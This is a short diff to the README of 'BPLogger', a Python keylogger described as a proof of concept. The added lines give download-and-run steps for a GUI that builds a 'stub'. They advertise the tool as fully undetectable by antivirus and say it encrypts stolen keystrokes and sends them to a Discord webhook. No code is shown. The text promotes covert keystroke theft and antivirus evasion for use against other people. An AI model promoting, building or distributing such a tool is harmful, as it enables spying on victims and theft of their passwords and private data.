@@ -5,10 +5,13 @@ Introduction
 > [+] BPLogger is a POC made to demonstrate how a simple Python program is able to steal the keyboard activity from someone while passing most of the antivirus protections.
 
 
-How do i run it?
+> [+] How do i run it?
+Download the files from the github and extract them to your desktop or wherever you choose.
+Run BPLogger and it will run a GUI to build your stub.
+Can be used via discord webhook.
 
 
-Features
+> Features
 FUD (fully undetectable)
 Encrypting the data
 Sending the data to your CS2 Discord Webhook
